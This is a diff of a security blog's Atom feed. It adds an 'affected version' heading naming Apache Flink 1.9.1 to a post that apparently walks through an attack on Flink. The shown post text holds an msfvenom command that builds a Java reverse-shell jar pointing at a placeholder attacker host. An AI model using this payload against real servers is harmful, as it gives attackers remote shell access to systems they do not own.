@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-11-13T09:49:44.722Z</updated>
+    <updated>2019-11-14T01:31:26.298Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -16,7 +16,10 @@
         <link href="http://www.svenbeast.com//post/GJfB5twey">
         </link>
         <updated>2019-11-13T09:35:18.000Z</updated>
-        <content type="html"><![CDATA[<ol>
+        <content type="html"><![CDATA[<h2 id="0x00-影响版本">0x00 影响版本</h2>
+<pre><code>目前最新版本Apache Flink 1.9.1
+</code></pre>
+<ol>
 <li>生成jar包</li>
 </ol>
 <pre><code>msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;test.jar
